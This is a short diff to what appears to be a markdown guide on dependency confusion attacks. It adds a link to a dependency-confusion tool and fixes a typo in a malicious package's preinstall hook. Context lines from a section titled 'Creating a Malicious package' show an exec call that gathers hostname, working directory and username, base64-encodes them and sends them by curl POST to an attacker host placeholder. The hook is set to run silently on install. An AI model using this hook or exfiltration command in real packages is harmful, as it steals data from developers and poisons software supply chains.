@@ -55,6 +55,7 @@ for dir in " $BASE_DIR " /*/; do
     fi
 done
 ```
+- Alternatively, try [https://github.com/visma-prodsec/confused](https://github.com/visma-prodsec/confused)
 - Then you just have to host the package yourself
 
 **Creating a Malicious package**
@@ -83,7 +84,7 @@ exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST {attack
     "description":"",
     "main":"main.js",
     "scripts":{
-        "preinstall":"node inddex.js > /dev/null 2>&1",
+        "preinstall":"node index.js > /dev/null 2>&1",
         "test":"echo \"Error: no test specified\""
     },
     "author":"asdasfasd.asfasdasfasd",
